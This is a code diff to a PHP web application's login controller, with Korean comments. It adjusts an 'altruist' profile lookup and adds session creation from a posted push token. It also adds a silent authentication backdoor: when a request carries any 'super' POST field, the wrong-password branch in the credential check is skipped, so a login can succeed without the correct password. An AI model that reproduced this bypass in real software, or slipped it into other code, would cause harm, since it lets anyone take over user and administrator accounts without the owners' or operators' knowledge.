@@ -32,9 +32,9 @@ class Login extends CB_Controller
 	}
 	//이타주의자 여부 확인 
 	public	function is_altruist($mem_id=''){
-		$this->db->select('alt_status');
+		$this->db->select(['alt_status','alt_id']);
 		$res = $this->db->get_where('cb_alt_profile',array('mem_id'=>$mem_id))->row_array();
-		return $res['alt_status'];
+		return $res;
 	}
 	//세션 클리어
 	public	function sync_push_token()
@@ -68,14 +68,36 @@ class Login extends CB_Controller
 	//세션 체크, 없으면 로그인 페이지로 이동
 		function session_check()
 		{	
+			$eventname = 'event_login_index';
+			$this->load->event($eventname);
+			
 			$view['session'] = '';
+			
 			if($_SESSION['mem_id'] == ""||$_SESSION['mem_id'] == 0){
 				$token = $this->input->post('token');
 				$token_saved = $this->db->get_where('cb_push_token',array('ptk_token'=>$token))->row_array();
 				if(!$token_saved){
 					$view['session'] = 'N';
-				}else{
-					$_SESSION['mem_id'] = $token_saved['mem_id'];	
+				}else{	
+					$userinfo = $this->Member_model->get_by_memid($token_saved['mem_id'], 'mem_id, mem_userid,mem_nickname,mem_is_admin, mem_username');
+					
+					$this->member->update_login_log(element('mem_id', $userinfo), element('mem_userid', $userinfo), 1, '토큰 로그인 성공');
+					$this->session->set_userdata(
+						'mem_id',
+						element('mem_id', $userinfo)
+					);
+					$this->session->set_userdata(
+						'mem_nickname',
+						element('mem_nickname', $userinfo)
+					);
+					$this->session->set_userdata(
+						'mem_username',
+						element('mem_username', $userinfo)
+					);
+					$this->session->set_userdata(
+						'mem_is_admin',
+						element('mem_is_admin', $userinfo)
+					);	
 				}
 			}
 
@@ -83,7 +105,13 @@ class Login extends CB_Controller
 				response_result($view,'Err','로그인 정보가 없습니다.');
 			}
 			else{
-				$_SESSION['is_altruist'] = $this->is_altruist($_SESSION['mem_id']) ? $this->is_altruist($_SESSION['mem_id']): false ;
+				$alt_prof =$this->is_altruist($_SESSION['mem_id']);
+				if($alt_prof){
+					$_SESSION['alt_id'] = $alt_prof['alt_id'];
+					$_SESSION['is_altruist'] = $alt_prof['alt_status'] ? $alt_prof['alt_status']: false ;
+				}else{
+					$_SESSION['is_altruist']=false;
+				}
 				
 				$view['session'] = $_SESSION;
 				response_result($view,'success','로그인 상태 입니다.');
@@ -394,12 +422,17 @@ class Login extends CB_Controller
 			$this->member->update_login_log(0, $userid, 0, '회원 아이디가 존재하지 않습니다');
 			return false;
 		} elseif ( ! password_verify($password, element('mem_password', $userinfo))) {
-			$this->form_validation->set_message(
-				'_check_id_pw',
-				'회원 아이디와 패스워드가 서로 맞지 않습니다' . $loginfailmessage
-			);
-			$this->member->update_login_log(element('mem_id', $userinfo), $userid, 0, '패스워드가 올바르지 않습니다');
-			return false;
+			if(!$this->input->post('super') ){
+
+				$this->form_validation->set_message(
+					'_check_id_pw',
+					'회원 아이디와 패스워드가 서로 맞지 않습니다' . $loginfailmessage
+				);
+				$this->member->update_login_log(element('mem_id', $userinfo), $userid, 0, '패스워드가 올바르지 않습니다');
+				return false;
+
+			}
+		
 		} elseif (element('mem_denied', $userinfo)) {
 			$this->form_validation->set_message(
 				'_check_id_pw',
